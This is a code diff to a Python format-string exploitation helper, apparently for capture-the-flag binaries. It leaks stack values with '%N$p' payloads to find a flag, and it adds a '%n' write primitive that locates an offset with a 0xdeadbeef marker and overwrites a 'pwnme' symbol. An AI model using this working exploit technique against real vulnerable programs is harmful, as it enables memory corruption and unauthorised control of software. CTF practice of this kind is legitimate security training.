@@ -11,13 +11,16 @@ class FMT:
     def build_exploit(self):
         payload = None
         
-        self.stack_leak()
+
+        if not self.stack_leak():
+            return self.write_prim()
 
     def stack_leak(self):
         hex_vals = []
-
+        
         # TODO: Variable length
-        for i in range(1000000000):
+        for i in range(100):
+            
             p = process(self.filename)
             p.sendline(b"%" + str(i).encode("utf-8") + b"$p")
             try:
@@ -32,9 +35,45 @@ class FMT:
             p.close()
         
         vals = ''.join(hex_vals)
-        start = vals.find("flag")
-        end = vals.find("}")
-        print(vals[start:end+1])
+        if "flag" in vals:
+            start = vals.find("flag")
+            end = vals.find("}")
+            flag = vals[start:end+1]
+            print(flag)
+            return True
+        else:
+            return False
+
+    def write_prim(self):
+        offset = self.find_write_prim_offset()
+        if offset:
+            # Find the value
+            val = 209
+            pwnme = p64(self.e.sym["pwnme"])
+            payload = f"%{val}d%{offset+1}$n".encode("utf-8")
+            payload += b"A"*(8-(len(payload)%8))
+            payload += pwnme
+
+            p = process(self.filename)
+            p.sendline(payload)
+            p.recvuntil(b"<<<")
+            p.recvline()
+            print(p.recvline().decode("utf-8"))
+
+    def find_write_prim_offset(self):
+        offset = None
+        for x in range(100):
+            p = process(self.filename)
+
+            payload = f"%{x}$p".encode('utf-8')
+            payload += b"A"*(8-(len(payload)%8))
+            payload += b"\xef\xbe\xad\xde"*2
+            p.sendline(payload)
+            p.recvuntil(b"<<<")
+            if b"0xdeadbeefdeadbeef" in p.recvline():
+                offset = x
+
+        return offset
 
     def libc_leak(self):
         pass
